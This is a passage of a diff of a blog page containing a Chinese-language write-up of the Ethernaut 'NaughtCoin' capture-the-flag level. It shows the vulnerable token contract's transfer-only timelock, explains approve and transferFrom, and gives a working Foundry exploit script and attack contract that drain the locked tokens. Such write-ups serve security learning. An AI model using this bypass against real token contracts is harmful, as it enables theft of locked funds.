INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>在ERC20标准中存在两个转钱的方法，分别是<code>transfer</code>和<code>transferFrom</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">      address spender = _msgSender();</span><br><span class="line">      _spendAllowance(from, spender, amount);</span><br><span class="line">      _transfer(from, to, amount);</span><br><span class="line">      return true;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在是使用<code>transferFrom</code>要先使用<code>approve</code>方法，简单来说就是代币拥有者允许某个地址的交易代币的数量。	</p>
+<h3 id="Exp-4"><a href="#Exp-4" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract NaughtCoinSolution is Script &#123;</span><br><span class="line">    NaughtCoin naughtCoin = NaughtCoin(0xC0Faf18D2b14706353A4a62D752b1Ca4bbe63b5c);</span><br><span class="line"></span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        NaughtCoinAttack attack = new NaughtCoinAttack(address(naughtCoin));</span><br><span class="line">        ERC20(address(naughtCoin)).approve(address(attack), 1000000 * 1e18);</span><br><span class="line">        attack.attack();</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract NaughtCoinAttack &#123;</span><br><span class="line">    address public constant PLAYER = 0x1fec23bf3a1424726dD60b998B9BCf6b3B42b800;</span><br><span class="line">    NaughtCoin naughtCoin;</span><br><span class="line"></span><br><span class="line">    constructor(address _naughtCoin) &#123;</span><br><span class="line">        naughtCoin = NaughtCoin(_naughtCoin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        naughtCoin.transferFrom(PLAYER, address(this), 1000000 * 1e18);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2026/01/27/ethernautP1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -231,7 +406,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/01/27/ethernautP1/" class="post-title-link" itemprop="url">Puppet</a>
+          <a href="/2026/01/27/ethernautP1/" class="post-title-link" itemprop="url">Ethernaut 1-10</a>
         </h2>
 
         <div class="post-meta-container">
